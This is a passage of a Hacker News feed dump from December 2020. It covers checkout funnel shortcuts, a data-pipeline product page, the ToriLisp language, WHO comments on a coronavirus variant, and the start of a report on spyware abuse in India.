</div><blockquote><div lang="en" dir="ltr"><p><a href="https://t.co/QGIOG19H84">https://t.co/QGIOG19H84</a></p><p>Learn how Amazon uses "One click" purchases to shortcut their conversion funnel. Brainstorm how you can use this principle to improve your business.</p><p>ğŸ‘‡ğŸ‘‡ğŸ‘‡</p></div>â€” It's Not Magic (@its_not_magic) <a href="https://twitter.com/its_not_magic/status/1341393341783691264?ref_src=twsrc%5Etfw">December 22, 2020</a></blockquote> <div><h2>When can we use this?</h2>
<p>Consider offering a user the chance to skip steps when they signal intent. It's not always
the right thing to do, but the cost is often low.</p>
<p>Imagine a user starts off on a pricing page for a plan, and then moves to other parts of
your site. Later in the visit, you could show them a banner with a deal for that plan -
2 months off with the purchase of a 1 year plan. This moves the user away from the
(blog â¡ plans â¡ compare â¡ checkout) flow and straight to checkout.</p>
<p>If a customer adds something to their cart and then bounces, send them an email reminding
them that they had the item in their cart and offer to take them straight to checkout.
This takes your funnel from (??? â¡ site â¡ plans â¡ compare â¡ checkout) and turns it into
(email â¡ checkout).</p>
<p>Make sure that you understand what your conversion funnel looks like. It'll be harder to
short-circuit something that you haven't formalized.</p>
<p>It's possible to take this too far. Do not take this too far. I'm waiting
for the day that I read a news article about some CEO who thinks, "We have all
these credit cards on file, and our recommendation algorithm is really good.
We can buy people things that we're 100% confident that they will like." Do not
be this CEO. <a href="https://xkcd.com/1494/">That "growth hack" they just thought of is called "credit card
fraud" and it is a crime</a></p>
</div><div><div><div><div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async"></p></div><p>Jacob Voytko</p></div><div><div><p>Ahoy everyone ğŸ‘‹ I'm Jacob. If you've worked with me before,
then you know that I love spreadsheets and digging to find answers with numbers.
I made this newsletter to demonstrate one simple thing: you don't need to be a
math whiz to get some useful insights. All you need is a
question and some determination.</p>
<p>I'm just setting out on my journey as an indie hacker. Previously, I worked at
Etsy as a staff software engineer. Before that, I worked on Google Docs.</p>
</div></div></div></div><div><div><p>We will never spam you ğŸ˜Œ</p></div></div></div></div>]]>
            </description>
            <link>https://notmagic.tech/posts/0002-increase-conversions-with-short-circuits</link>
            <guid isPermaLink="false">hacker-news-small-sites-25506940</guid>
            <pubDate>Tue, 22 Dec 2020 15:11:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Automate data pipeline creation in minutes]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25506864">thread link</a>) | @steveeast112
<br/>
December 22, 2020 | https://phiona.com/developers | <a href="https://web.archive.org/web/*/https://phiona.com/developers">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-nc-base="header" data-controller="AncillaryLayout">
      

      

      <div>

        

        <div>
          
            
              
                
                  
                
              
            
          

          <main>
            
              <section data-content-field="main-content">
                <div data-type="page" data-updated-on="1608585610408" id="page-5fdb74c3ca12287942885937"><div><div><div><div><div data-block-type="2" id="block-a05cf873aa9d26583a73"><p><h2>Stop wasting time searching for clean datasets, boring wrangling tasks, and pipeline troubleshooting. Use Phiona to spend more time using your data instead of preparing it.</h2></p></div></div></div><div><div><div data-block-type="2" id="block-8b39e5b79306ae1f4000"><p><h3>Trusted by innovative teams at</h3></p></div><div data-aspect-ratio="10.393258426966293" data-block-type="5" id="block-08ca795ee8cc8f020e5f"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1598628068502-VYJP524RL8KH211A3NCG/ke17ZwdGBToddI8pDm48kNaYRLG9rKUlFFufJWcco4IUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYy7Mythp_T-mtop-vrsUOmeInPi9iDjx9w8K4ZfjXt2drl-Iw5on9671eGDf40NAtFzJ8Aan9v7kOLRiuHPM-M6CjLISwBs8eEdxAxTptZAUg/logos0820.png" data-image="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1598628068502-VYJP524RL8KH211A3NCG/ke17ZwdGBToddI8pDm48kNaYRLG9rKUlFFufJWcco4IUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYy7Mythp_T-mtop-vrsUOmeInPi9iDjx9w8K4ZfjXt2drl-Iw5on9671eGDf40NAtFzJ8Aan9v7kOLRiuHPM-M6CjLISwBs8eEdxAxTptZAUg/logos0820.png" data-image-dimensions="1847x241" data-image-focal-point="0.5,0.5" alt="logos0820.png" data-load="false" data-image-id="5fdb74c3ca12287942885907" data-type="image" src="https://phiona.com/logos0820.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div></div></div><div><div><div data-block-type="5" id="block-5c4ea2ce0033db55dae7"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1556109667516-DNZR7DIU2FTVEB99KMP4/ke17ZwdGBToddI8pDm48kAKgoLjNQ6aJ1OnxYPBg4sFZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7UnCxNA8dHvmd7460Z7fbKGEzcjpSdFU6DwkSIQwBDOi_nLKPUGQem99tOczItW9iQ/yesno_150.png" data-image="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1556109667516-DNZR7DIU2FTVEB99KMP4/ke17ZwdGBToddI8pDm48kAKgoLjNQ6aJ1OnxYPBg4sFZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7UnCxNA8dHvmd7460Z7fbKGEzcjpSdFU6DwkSIQwBDOi_nLKPUGQem99tOczItW9iQ/yesno_150.png" data-image-dimensions="125x125" data-image-focal-point="0.5,0.5" alt="yesno_150.png" data-load="false" data-image-id="5fdb74c3ca12287942885913" data-type="image" src="https://phiona.com/yesno_150.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-93a61b2570662620499b"><div><h2><strong>Simple</strong></h2><p>A visual development interface makes it easy to build complex data pipelines with minimal code.</p></div></div></div><div><div data-block-type="5" id="block-7005228778f7616fa562"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1556112241966-9EE3U8DU8HDMOY7MUXX4/ke17ZwdGBToddI8pDm48kAKgoLjNQ6aJ1OnxYPBg4sFZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7UnCxNA8dHvmd7460Z7fbKGEzcjpSdFU6DwkSIQwBDOi_nLKPUGQem99tOczItW9iQ/ds_Time.png" data-image="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1556112241966-9EE3U8DU8HDMOY7MUXX4/ke17ZwdGBToddI8pDm48kAKgoLjNQ6aJ1OnxYPBg4sFZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7UnCxNA8dHvmd7460Z7fbKGEzcjpSdFU6DwkSIQwBDOi_nLKPUGQem99tOczItW9iQ/ds_Time.png" data-image-dimensions="125x125" data-image-focal-point="0.5,0.5" alt="ds_Time.png" data-load="false" data-image-id="5fdb74c3ca12287942885916" data-type="image" src="https://phiona.com/ds_Time.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-796aaafd35e1496b207a"><div><h2><strong>Quick</strong></h2><p>Reduce the time needed to wrangle and automate your data work by up to 90%.</p></div></div></div><div><div data-block-type="5" id="block-169e103b7813d743b068"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1556112343044-A6ED2T8PX818LZ49DEVH/ke17ZwdGBToddI8pDm48kAKgoLjNQ6aJ1OnxYPBg4sFZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7UnCxNA8dHvmd7460Z7fbKGEzcjpSdFU6DwkSIQwBDOi_nLKPUGQem99tOczItW9iQ/bc_exploration.png" data-image="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1556112343044-A6ED2T8PX818LZ49DEVH/ke17ZwdGBToddI8pDm48kAKgoLjNQ6aJ1OnxYPBg4sFZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7UnCxNA8dHvmd7460Z7fbKGEzcjpSdFU6DwkSIQwBDOi_nLKPUGQem99tOczItW9iQ/bc_exploration.png" data-image-dimensions="125x125" data-image-focal-point="0.5,0.5" alt="bc_exploration.png" data-load="false" data-image-id="5fdb74c3ca12287942885919" data-type="image" src="https://phiona.com/bc_exploration.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-d79557007687e3f32be6"><div><h2><strong>Shareable</strong></h2><p>Make updated datasets available via REST API, scheduled emails, or database updates.</p></div></div></div></div><div data-block-type="5" id="block-6ee586293a2570e83d86"><div>








  

    

      <figure data-scrolled="" data-test="image-block-v2-outer-wrapper">

        <div>
          
            <div data-animation-role="image" data-description="" data-animation-override="">
            
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1599231156688-MKEJ28A2O4BHB5NLT5HU/ke17ZwdGBToddI8pDm48kD3dMZg4N0_7yQbmB8aGnRAUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKchuoFp51Zn2NKlmB0zEAPtYHxsMM9UBX7ODbp6nqB1kCWiY39Atxpq51N24fh7yK2/integrationsv2.png" data-image="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1599231156688-MKEJ28A2O4BHB5NLT5HU/ke17ZwdGBToddI8pDm48kD3dMZg4N0_7yQbmB8aGnRAUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKchuoFp51Zn2NKlmB0zEAPtYHxsMM9UBX7ODbp6nqB1kCWiY39Atxpq51N24fh7yK2/integrationsv2.png" data-image-dimensions="1147x995" data-image-focal-point="0.5,0.5" alt="integrationsv2.png" src="https://phiona.com/integrationsv2.png"></p>
          
            </div>
          

        </div>

        
          
          <figcaption data-width-ratio="">
            <div>

              
                <div><p>Connect to your online and offline data</p></div>
              

              
                <div><p>Seamlessly connect your data within a virtual data mesh, without changing the underlying detail. No more tracking down loose CSV files or credentials for rogue databases.</p></div>
              

              
                <div><div></div></div>
              

            </div>
          </figcaption>
        

      </figure>

    

  


</div></div><div data-block-type="5" id="block-8c9f808f8dd8365fafbd"><div>








  

    

      <figure data-scrolled="" data-test="image-block-v2-outer-wrapper">

        <div>
          
            <div data-animation-role="image" data-description="" data-animation-override="">
            
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1601415925894-9967DQSXJ7G02UKKTVEL/ke17ZwdGBToddI8pDm48kO5UttOiHZHOdyRgSsyxuNx7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UU-GMacxtmTFmxj8iTLE5xm_olV_MfCgX22vGCD_WHCDOpYghpI-Ha_TwZsqqmJXng/spreadsheetdata.png" data-image="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1601415925894-9967DQSXJ7G02UKKTVEL/ke17ZwdGBToddI8pDm48kO5UttOiHZHOdyRgSsyxuNx7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UU-GMacxtmTFmxj8iTLE5xm_olV_MfCgX22vGCD_WHCDOpYghpI-Ha_TwZsqqmJXng/spreadsheetdata.png" data-image-dimensions="1860x1085" data-image-focal-point="0.5,0.5" alt="spreadsheetdata.png" src="https://phiona.com/spreadsheetdata.png"></p>
          
            </div>
          

        </div>

        
          
          <figcaption data-width-ratio="">
            <div>

              
                <div><p>Your Friendly Data Cleaning Co-Pilot</p></div>
              

              
                <div><p>No more searching for data inconsistencies. Phiona automatically detects potential issues in your data, and you simply select answers on fixing duplicates, inconsistencies, formatting issues and more. We translate the code.</p></div>
              

              

            </div>
          </figcaption>
        

      </figure>

    

  


</div></div><div data-block-type="5" id="block-2031c64bd6b934a35042"><div>








  

    

      <figure data-scrolled="" data-test="image-block-v2-outer-wrapper">

        <div>
          
            <div data-animation-role="image" data-description="" data-animation-override="">
            
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1608232967485-BXG8CZ5VJNZA370RNYJD/ke17ZwdGBToddI8pDm48kHzdCBlQ63jloI4u1zY60pd7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1USvOE0u8pvGxmG7zkdumOsgVB75yStXGYsj0BUW2Nf6kZDqXZYzu2fuaodM4POSZ4w/devpipelines.png" data-image="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1608232967485-BXG8CZ5VJNZA370RNYJD/ke17ZwdGBToddI8pDm48kHzdCBlQ63jloI4u1zY60pd7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1USvOE0u8pvGxmG7zkdumOsgVB75yStXGYsj0BUW2Nf6kZDqXZYzu2fuaodM4POSZ4w/devpipelines.png" data-image-dimensions="2193x1075" data-image-focal-point="0.5,0.5" alt="devpipelines.png" src="https://phiona.com/devpipelines.png"></p>
          
            </div>
          

        </div>

        
          
          <figcaption data-width-ratio="">
            <div>

              
                <div><p>Translate Actions to Automated Pipelines</p></div>
              

              
                <div><p>Build complex data workflows by interactively transforming and applying changes as blueprints within a spreadsheet view. Easily orchestrate your data refreshes, blueprint runs and exports.</p></div>
              

              

            </div>
          </figcaption>
        

      </figure>

    

  


</div></div><div data-block-type="5" id="block-yui_3_17_2_1_1608219965971_159353"><div>








  

    

      <figure data-scrolled="" data-test="image-block-v2-outer-wrapper">

        <div>
          
            <div data-animation-role="image" data-description="">
            
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1608235844858-T9Q76MLETSGFVY6CUV3Z/ke17ZwdGBToddI8pDm48kIn7BAG94Odok_K7Rz00kXYUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYy7Mythp_T-mtop-vrsUOmeInPi9iDjx9w8K4ZfjXt2dqZyB6qEyaPLXnAX3UrkJTH_shP7bOKuqeKATYfTuMZGCjLISwBs8eEdxAxTptZAUg/blueprintversioncontrol.png" data-image="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1608235844858-T9Q76MLETSGFVY6CUV3Z/ke17ZwdGBToddI8pDm48kIn7BAG94Odok_K7Rz00kXYUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYy7Mythp_T-mtop-vrsUOmeInPi9iDjx9w8K4ZfjXt2dqZyB6qEyaPLXnAX3UrkJTH_shP7bOKuqeKATYfTuMZGCjLISwBs8eEdxAxTptZAUg/blueprintversioncontrol.png" data-image-dimensions="1964x937" data-image-focal-point="0.5,0.5" alt="blueprintversioncontrol.png" src="https://phiona.com/blueprintversioncontrol.png"></p>
          
            </div>
          

        </div>

        
          
          <figcaption data-width-ratio="">
            <div>

              
                <div><p>Version Control Out of the Box <em>(coming soon)</em></p></div>
              

              
                <div><p>Data is always changing, make sure your blueprints keep up with the times. Edit blueprints in the same way you would with code, share them with others, and keep track of them in one place.</p></div>
              

              

            </div>
          </figcaption>
        

      </figure>

    

  


</div></div><div data-block-type="5" id="block-48460b2d31a95d9d7c27"><div>








  

    

      <figure data-scrolled="" data-test="image-block-v2-outer-wrapper">

        <div>
          
            <div data-animation-role="image" data-description="" data-animation-override="">
            
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1601415280001-9U6KPETMAA9JJX6WTVCE/ke17ZwdGBToddI8pDm48kDjVpyDjcaeNCv9xcSPysqJ7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UdvHFhwYv4HfPO0n3CEjYxeTIAv0UCX0AZ_4taFu_eJf7zs2yPjc1ECvpa5Zm_kMqw/schedule.png" data-image="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1601415280001-9U6KPETMAA9JJX6WTVCE/ke17ZwdGBToddI8pDm48kDjVpyDjcaeNCv9xcSPysqJ7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UdvHFhwYv4HfPO0n3CEjYxeTIAv0UCX0AZ_4taFu_eJf7zs2yPjc1ECvpa5Zm_kMqw/schedule.png" data-image-dimensions="1714x1016" data-image-focal-point="0.5,0.5" alt="schedule.png" src="https://phiona.com/schedule.png"></p>
          
            </div>
          

        </div>

        
          
          <figcaption data-width-ratio="">
            <div>

              
                <div><p>No more cron job chaos</p></div>
              

              
                <div><p>Run your saved blueprints on a schedule or trigger runs via webhook. Refresh data from one system and update it in another. Or, leave data in the data mesh to be securely accessed via API.</p></div>
              

              

            </div>
          </figcaption>
        

      </figure>

    

  


</div></div><div><div><div data-block-type="5" id="block-2cfbee302d337d43b806"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1599509477841-FW9UVGVI6H1EYZ4CPSCP/ke17ZwdGBToddI8pDm48kCdtISRWKP5pMtlo1NrprM5Zw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIdM008-1-KNBfG6kGbj0MupHQG6B7Wfd8o78WB9FeEwQ/phionalogo.png" data-image="https://images.squarespace-cdn.com/content/v1/5b8e9fc3506fbeb4312d3729/1599509477841-FW9UVGVI6H1EYZ4CPSCP/ke17ZwdGBToddI8pDm48kCdtISRWKP5pMtlo1NrprM5Zw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIdM008-1-KNBfG6kGbj0MupHQG6B7Wfd8o78WB9FeEwQ/phionalogo.png" data-image-dimensions="947x285" data-image-focal-point="0.5,0.5" alt="phionalogo.png" data-load="false" data-image-id="5fdb74c3ca1228794288592c" data-type="image" src="https://phiona.com/phionalogo.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div></div></div><div data-block-type="2" id="block-95e5445731557381c156"><p>Get started today with Phiona for free, no credit card required.</p></div></div></div></div>
              </section>
            
          </main>

        </div>
      </div>

      


    </div></div>]]>
            </description>
            <link>https://phiona.com/developers</link>
            <guid isPermaLink="false">hacker-news-small-sites-25506864</guid>
            <pubDate>Tue, 22 Dec 2020 15:05:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[ToriLisp â€“ an ersatz Lisp for tiny birds]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25506759">thread link</a>) | @grzm
<br/>
December 22, 2020 | http://blog.fogus.me/2020/12/22/torilisp-an-ersatz-lisp-for-tiny-birds/ | <a href="https://web.archive.org/web/*/http://blog.fogus.me/2020/12/22/torilisp-an-ersatz-lisp-for-tiny-birds/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="body">

                <div id="post-6698">
                 <h3><a href="http://blog.fogus.me/2020/12/22/torilisp-an-ersatz-lisp-for-tiny-birds/" title="ToriLisp â€“ an ersatz LISP for tiny birds">ToriLisp â€“ an ersatz LISP for tiny birds</a></h3>
                 <p><span>Dec 22, 2020 </span></p><p>When deciding to work on a side-project three factors are needed to transition from fancy to application: goal, motivation, and time.</p>

<p>Time is usually the biggest sticking point for me personally but with COVID most of what I may have spent my time on this year was cancelled. However, motivation was still a huge sticking point until I came across a couple of projects that helped propel me forward. First, I spent some time earlier this year combing over <a href="https://twitter.com/maryrosecook">Mary Rose Cook</a>â€˜s lovely <a href="https://github.com/maryrosecook/littlelisp">Little Lisp</a> interpreter code. Given what I knew about Maryâ€™s previous projects it was no surprise that the Little Lisp implementation was simple and elegant. However, what I wasnâ€™t prepared for was that hacking on the interpreter turned out to be straight-forward and addictive. However, it wasnâ€™t until I re-discovered <a href="https://twitter.com/wtaysom">William Taysom</a>â€˜s old Scheme-like language <a href="https://web.archive.org/web/20090625142941/http://moonbase.rydia.net/mental/blog/programming/misp-is-a-lisp">Misp</a> that I had a form for the interpreter in mind. At the time of Williamâ€™s original blog posts about Misp I was drawn to his passion and enjoyed the implementations of the language that he posted.<sup id="fnref:dustbin"><a href="#fn:dustbin" rel="footnote">1</a></sup> Around the same time I found Paul Grahamâ€™s original Arc tutorial <a href="http://www.arclanguage.org/tut.txt">tut.txt</a> and used it extensively to guide me in what to implement next.<sup id="fnref:readme"><a href="#fn:readme" rel="footnote">2</a></sup> All discussion about Arc aside, I definitely appreciate the clarity and layout of the Arc tutorial and found it a great outline for a little language.</p>

<p>Finally, as some of you might know I <a href="https://www.amazon.com/gp/product/B00D624AQO?tag=fogus-20">dabbled in functional programming in JavaScript</a> and even went so far as to create a couple of libraries pushing the fringe of fp in js; namely <a href="https://github.com/fogus/lemonad">Lemonad</a> and <a href="https://github.com/documentcloud/underscore-contrib">underscore-contrib</a>. Some of the ideas in these libraries found their way into my own interpreter which ultimately pushed my code away from Misp, Little Lisp, and Arc into â€¦something else â€” that something else Iâ€™m calling <strong>Tori Lisp â€” an ersatz LISP for little birds</strong>.</p>

<center>ToriLisp = Litle Lisp + Misp + tut.txt + Lemonad + underscore-contrib + a pinch of CLJ</center>

<p>Hereâ€™s a very small sample of the language:</p>

<pre><code>é³¥&gt;  (let (x 3 y 4)
       (+ (* x 2) (* y 2)))
;;=&gt; 14

(def map
  (Î» (fn list)
    (if (no list)
      list
      (cons (fn (first list))
            (map fn (rest list))))))

é³¥&gt;  (map (+ 10) '(1 2 3))
;;=&gt; [ 11, 12, 13 ]

é³¥&gt;  ({x y | (/ (+ x y) 2)} 2 4)
;;=&gt; 3

é³¥&gt;  (len "abc")
;;=&gt; 3
é³¥&gt;  (len {a | a})
;;=&gt; 1
é³¥&gt;  (len +)
;;=&gt; 2

é³¥&gt;  (read "(push [1] 'Z)")
;;=&gt; [ "'push", [ "'list", 1 ], [ "'quote", "'Z" ] ]
é³¥&gt;  (eval (read "(push [1] 'Z)"))
;;=&gt; [ "'Z", 1 ]  
</code></pre>

<p>If I wanted to present a list of features then the following list would work:<sup id="fnref:mac"><a href="#fn:mac" rel="footnote">3</a></sup></p>

<ul>
<li>Functional</li>
<li>Immutable access to JavaScript arrays and hash-maps.</li>
<li>Function auto-currying</li>
<li>Function introspection</li>
<li>Bottoms-out at JavaScript structures and functions</li>
<li>ML-like Refs</li>
<li>Lightweight syntax for common language forms</li>
</ul>

<p>If youâ€™re interested in checking out the language then the <a href="https://github.com/fogus/tori-lisp">ToriLisp Github repository</a> has a quick start, test suite, and its own tut.txt.</p>



            </div>
            <!-- end comments_wrapper -->            </div></div>]]>
            </description>
            <link>http://blog.fogus.me/2020/12/22/torilisp-an-ersatz-lisp-for-tiny-birds/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25506759</guid>
            <pubDate>Tue, 22 Dec 2020 14:53:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[WHO says no need for major alarm over new coronavirus strain â€“ CTV News]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25506698">thread link</a>) | @mrfusion
<br/>
December 22, 2020 | https://www.ctvnews.ca/health/coronavirus/who-says-no-need-for-major-alarm-over-new-coronavirus-strain-1.5240287 | <a href="https://web.archive.org/web/*/https://www.ctvnews.ca/health/coronavirus/who-says-no-need-for-major-alarm-over-new-coronavirus-strain-1.5240287">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>GENEVA/ZURICH -- 
	The World Health Organization cautioned against major alarm over a new, highly infectious variant of the coronavirus that has emerged in Britain, saying this was a normal part of a pandemic's evolution.</p>
<p>
	WHO officials even put a positive light on the discovery of the new strains that prompted a slew of alarmed countries to impose travel restrictions on Britain and South Africa, saying new tools to track the virus were working.</p>
<p>
	"We have to find a balance. It's very important to have transparency, it's very important to tell the public the way it is, but it's also important to get across that this is a normal part of virus evolution," WHO emergencies chief Mike Ryan told an online briefing.</p>
<p>
	"Being able to track a virus this closely, this carefully, this scientifically in real time is a real positive development for global public health, and the countries doing this type of surveillance should be commended."</p>
<ul>
	<li>
		<a href="https://www.ctvnews.ca/newsletters/the-covid19-brief-newsletter-signup"><strong>Newsletter sign-up: Get The COVID-19 Brief sent to your inbox</strong></a></li>
</ul>
<p>
	Citing data from Britain, WHO officials said they had no evidence that the variant made people sicker or was more deadly than existing strains of COVID-19, although it did seem to spread more easily.</p>
<p>
	Countries imposing travel curbs were acting out of an abundance of caution while they assess risks, Ryan said, adding: "That is prudent. But it is also important that everyone recognizes that this happens, these variants occur."</p>
<p>
	WHO officials said coronavirus mutations had so far been much slower than with influenza and that even the new UK variant remained much less transmissible than other diseases like mumps.</p>
<p>
	They said vaccines developed to combat COVID-19 should handle the new variants as well, although checks were under way to ensure this was the case.</p>
<p>
	"So far, even though we have seen a number of changes, a number of mutations, none has made a significant impact on either the susceptibility of the virus to any of the currently used therapeutics, drugs or the vaccines under development and one hopes that will continue to be the case," WHO Chief Scientist Soumya Swaminathan told the briefing.</p>
<p>
	The WHO said it expects to get more detail within days or weeks on the potential impact of the highly transmissible new coronavirus strain.</p>
<p>
	<em>Reporting by Emma Farge in Geneva and Michael Shields in Zurich; Writing by Josephine Mason; editing by Mark Heinrich.</em></p>
                                              </div></div>]]>
            </description>
            <link>https://www.ctvnews.ca/health/coronavirus/who-says-no-need-for-major-alarm-over-new-coronavirus-strain-1.5240287</link>
            <guid isPermaLink="false">hacker-news-small-sites-25506698</guid>
            <pubDate>Tue, 22 Dec 2020 14:46:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Indiaâ€™s booming dark data economy]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25506681">thread link</a>) | @pseudolus
<br/>
December 22, 2020 | https://restofworld.org/2020/all-the-data-fit-to-sell/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2020/all-the-data-fit-to-sell/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p><span>A</span>yushi Sahu was ambushed. One evening in 2018, five months after her wedding, the 21-year-old college student was visiting her parents in the central Indian state of Chhattisgarh, when her husband showed up unannounced, his father and uncle in tow.</p>



<p>As the men settled in the living room, her husband said he had something he wanted them to hear. He took out his mobile phone and pressed â€œplay.â€ The audio was loud and clear: private conversations between Sahu and her friends and family,<strong> </strong>which had been recorded without her permission. And it wasnâ€™t only audio: â€œcall logs, SMS, and WhatsApp messages, each photo and video, recordings of my video calls â€” he claimed to have accessed everything,â€ Sahu said. That was when she realized that her husband had, for months, been spying on her.</p>



<p>This was also how Sahu learned of certain things he had been holding against her. (Her name has been changed to protect against retaliation.) He had been offended to hear her complaining to her mother about problems with her in-laws. And he objected to her talking to a male friend. â€œHe made a scene as if he was â€˜exposingâ€™ me,â€ Sahu recalled. â€œI was just sharing my concerns. Thatâ€™s normal.â€</p>



<p>Her husband played several more recordings, until his father eventually intervened. â€œI donâ€™t want to listen to any more of this. You have heard it all? Okay, then,â€ he said, before reaching out to comfort Sahu, who was still in shock.</p>



<p>After processing the experience, Sahu decided she was willing to shrug it off, apologize, and move on, but her new husband continued to behave strangely. Eventually, she felt she had no choice but to end the marriage. â€œI donâ€™t understand why he had to take this spying route,â€ she reflected. â€œHe could have just asked. You know, in India, men can scold their wives, right? He could have done that. What was the need to go so deep into my phone and record my conversations?â€</p>



<p>Sahu has no idea how her phone was bugged or for how long she was surveilled. But she has one clue: Her Vivo smartphone was an engagement gift from her husband.</p>



<p>It is likely that Sahuâ€™s phone had off-the-shelf spyware on it. Her husband may have installed it himself or even consulted a private detective before marrying her, who provided him with the phone. In either case, he would have been part of a growing trend of individuals â€” often, jealous lovers â€” making use of personal surveillance technology.</p>



